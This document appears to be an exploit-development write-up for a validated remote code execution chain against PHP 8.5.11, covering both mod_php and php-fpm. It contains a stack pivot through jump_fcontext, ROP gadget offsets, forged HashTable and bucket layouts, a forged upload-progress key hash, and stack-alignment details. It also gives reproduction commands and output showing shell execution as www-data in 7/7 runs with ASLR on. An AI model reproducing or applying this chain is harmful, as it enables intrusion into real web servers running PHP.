# B2 pivot + popen ROP variant

Status: validated on mod_php 8.5.11 (10 prefork children, 9 pins, stock
KeepAlive and php.ini-production): `uid=33(www-data)`. **Also validated on
php-fpm 8.5.11, no forged `execute_data`, ASLR on, stock `php.ini-production`,
one worker, no gdb: 7/7 runs `uid=33(www-data)`** (`fpm/run_rop_pivot.sh`, see
§"FPM data-only pivot"). The teardown destroy still can't carry the pivot (it
fires on the progress-clobbered bucket 0); the working trigger is the
upload-progress `zend_hash_update` itself, whose old-value destructor runs on
the clean bucket 0 before the insert overwrites it.

## Why replace the execute_data frame

The `zif_system` B2 needs a forged `zend_execute_data`: `func`, `num_args`, an
arg0 type that also serves as bucket 2's key, a NUL-terminated fake
`zend_string`, and a usable `return_value`. The pivot variant removes all of
those: a stack pivot plus a short ROP chain to `popen`.

## Mechanism (mod_php)

`pDestructor = libphp + 0x64904E` (inside `jump_fcontext`):

```
mov rsp,rdi                 ; stack = bucket 0 value
mov 0x40(rsp),r8            ; jmp target
ldmxcsr (rsp)               ; MXCSR at +0
fldcw 0x4(rsp)              ; x87 CW at +4
r12..rbp = [rsp+0x10..0x38]
rsp += 0x48
jmp *r8
```

Fake HashTable at `S`, `arData = S+0x20`; bucket 0's value is the pivot buffer:

| bucket offset | value |
|---|---|
| `+0x00` | MXCSR `0x1F80`, fldcw `0x037F` |
| `+0x08` | zval type `IS_NULL` (not `IS_UNDEF`) |
| `+0x10` | pivot (also `HT->pDestructor`; the gadget loads it into r12) |
| `+0x18..0x38` | zero |
| `+0x40` | `pop rdi;ret` (`lib+0x197128`) |
| `+0x48` | command pointer |
| `+0x50` | `pop rsi;ret` (`lib+0x195A89`) |
| `+0x58` | `"r"` pointer |
| `+0x60` | `ret` (`lib+0x183016`) |
| `+0x68` | `popen@plt` (`lib+0x18BBC0`) |

The A2 stale session reference is overwritten with a fake reference pointing to
the fake array; `track_init` destroys it, `zend_hash_destroy` calls
`pDestructor(&bucket0.val)`, and the pivot runs.

## Validation (mod_php)

```
STAGE3=stage3_rop.php CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/rop_proof
main=0x7a63ada00000 libphp=0x7a63aa400000
B2-ROP S=0x7a63adaf7398 pivot=0x7a63aaa4904e popen=0x7a63aa58bbc0
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## FPM gadgets (php-fpm 8.5.11, md5 `de9f7bd2799504ff67240075fd4e6a03`)

ELF vaddr offsets (re-derived from the container binary; add the leaked PIE base):

| gadget | offset |
|---|---|
| `jump_fcontext` pivot | `0x6bdd0e` |
| `pop rdi;ret` | `0x20a7e8` |
| `pop rsi;ret` | `0x209149` |
| `ret` (unused, see alignment) | `0x20a7e9` |
| `popen@plt` | `0x202e50` |
| `zif_system` | `0x60e3a0` |

There is no `system@plt` (PHP drives `popen`, not libc `system`), so the chain
must pass a valid `"r"` mode pointer in rsi. Confirmed by search: the binary has
exactly one `mov %rdi,%rsp` (the pivot), and no `mov/lea rsp,[rdi+imm]`, `xchg
reg,rsp`, or `pop rsp` with a usable ret. The pivot is the only stack pivot.

## The teardown-destroy obstacle (why the destroy can't carry the pivot)

The in-band B installs the fake table (`arData = d+0xE80`, `pDestructor`) through
the session decode. The arData-redirect element is a normal session var whose
value is `IS_PTR` → `HT+0x10`. `php_session_normalize_vars()` runs at decode end
and, for that `IS_PTR` bucket, does `ZVAL_UNDEF(zv)` on `zv = HT+0x10`; the type
write lands at `HT+0x18` = **nNumUsed**, zeroing it. So the upload-progress
`zend_hash_update` appends at bucket `[nNumUsed] = bucket 0`, overwriting the
pivot buffer's first bucket (val `+0x00` and type `+0x08`, 16-byte zval). The
teardown destroy then runs with `nNumUsed = 1` and fires `pDestructor(&bucket0.val)`
on that clobbered bucket:

```
PIVOT rdi=d+0xE80  P00=0x7ffff625c230 (progress array)  P08=0x307 (IS_ARRAY)  P40=pop_rdi ...
SIGSEGV at jump_fcontext+8 (ldmxcsr reads the array pointer as MXCSR -> #GP)
```

The `zif_system` frame tolerates this because it reads `num_args`/`arg0` from
buckets 1/2 (`+0x2C`/`+0x50`), which the 16-byte bucket-0 write never touches;
the pivot's `ldmxcsr (%rsp)` at `jump_fcontext+8` reads `[arData+0]` and cannot.
Preserving nNumUsed by reusing the arData key to redirect that element only
moves the failure earlier: the reuse `zend_hash_update` fires the (already
installed) `pDestructor` on the old `IS_PTR`→`HT+0x10` value → `ldmxcsr` of
`HT+0x10` → same #GP.

## FPM data-only pivot (working)

Don't use the teardown destroy. The upload-progress handler runs
`zend_hash_update(session_array, "upload_progress_<name>", &data)`, which for an
**existing** key calls `ht->pDestructor(&old->val)` *before* copying the new
value in. Forge that key at bucket 0 so its old value is the pivot buffer: the
update fires the pivot on a clean bucket 0, and the clobbering copy never runs
(the pivot does not return). nNumUsed is irrelevant (the lookup uses the hash
slots), so normalize zeroing it no longer matters.

Forged lookup for `upload_progress_x` (default prefix + the 1-byte progress
field) → bucket 0:

- `bucket0.h = DJBX33A("upload_progress_x") = 0xb3f1b35d4d1a35d5`, placed at
  `d+0xE90` (gadget's r12 slot, don't-care).
- `bucket0.key` → fill-resident `zend_string` (`len = 17`, bytes
  `"upload_progress_x"`); only `len`/val are read by the key compare. Placed at
  `d+0x200`, pointer in `d+0xE98` (r13 slot, don't-care).
- `arHash[(h | nTableMask) as int32] = 0`. `nTableMask = -16` (nTableSize 16),
  so the index is `-11` and the slot is `arData-0x2C = d+0xE54`.

Pivot buffer at bucket 0 (`d+0xE80`, 16-aligned):

| offset | value |
|---|---|
| `+0x00` | MXCSR `0x1F80` / fldcw `0x037F` (`0x0000037F00001F80`) |
| `+0x08` | zval type `IS_NULL` |
| `+0x10` | bucket0.h = key hash (r12) |
| `+0x18` | bucket0.key ptr (r13) |
| `+0x20..0x38` | r14/r15/rbx/rbp = 0 |
| `+0x40` | `pop rdi;ret` (gadget's `jmp *r8` target) |
| `+0x48` | command pointer (`d+0x100`) |
| `+0x50` | `pop rsi;ret` |
| `+0x58` | `"r"` pointer (`d+0x180`) |
| `+0x60` | `popen@plt` |

**Stack alignment:** `popen@plt` sits at `+0x60`, not `+0x68`. After the pivot's
`lea 0x48(%rsp),%rsp`, the chain enters `popen` with `rsp % 16 == 8` only when
the final slot is `+0x60`; a spare `ret` at `+0x68` shifts it to `0` and faults
`_IO_proc_open` on a `movaps`.

Command string at `d+0x100` (low byte `0x00`), `"r"` at `d+0x180`. The session
is unchanged from the `zif_system` nogdb chain except `p8` installs the pivot
gadget as `pDestructor` instead of `zif_system`:
`p1..p5` E0 prelude, `p6` arData=`d+0xE80`, `p7` nTableSize=16, `p8`
pDestructor=`base+0x6bdd0e`.

### Reproduction

```
cd ~/php2shell
bash fpm/run_rop_pivot.sh                 # MODE=nogdb (default), ASLR on
MODE=gdb PROBE=probe-rop-native.gdb bash fpm/run_rop_pivot.sh   # traced
```

Isolated stack: FPM `p2s-fpm-pivot` (port 9101) + nginx `p2s-nginx-pivot`
(9102) on network `p2s-pivot-net`, single worker. Leak/calibration are the
Round 37 values (`PRE=24576`, `DRIFT=0x37000`, `d = heap+0x15cbd8+DRIFT`,
`base = pie-0x7c9777`). Proof `/tmp/fpm_rop_proof`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reliability: 7/7 nogdb runs (ASLR on, stock `php.ini-production`). The worker
SIGSEGVs after the command (the pivot never returns); FPM respawns it.

## Tools

- `fpm/run_rop_pivot.sh`: the isolated FPM data-only pivot chain.
- `fpm/mk_rop_pivot.py`: overlays the pivot buffer + forged progress-key lookup
  onto the Round 37 `--nogdb` fill (`mk_native_fill.py --nogdb`).
- `fpm/probe-rop-native.gdb`: PIVOT + `popen@plt` trace.
- `fpm/probe-rop-diag.gdb`, `fpm/probe-rop-hash.gdb`: nNumUsed / bucket / key-hash
  diagnostics used to pin the obstacle.
- `off_chain/stage3_rop.php`: mod_php B2 variant (`STAGE3=stage3_rop.php`).
- `fpm/mk_rop_fill.py`, `fpm/probe-rop.gdb`: superseded pre-Round-37 FPM ROP
  artifacts (direct session-HT redirect; blocked by the bucket-0 clobber).

## Caveats

Offsets are for these builds (php:8.5.11-apache libphp and the php-fpm binary);
a real target needs the leaked bases and same-worker affinity (a single worker,
or spray/pin as in `FPM_RCE.md` §8). The forged progress-key hash
(`0xb3f1b35d4d1a35d5`) and slot index (`-11`) are specific to the key
`upload_progress_x` and `nTableSize = 16`; a different progress field value or
table size shifts both.
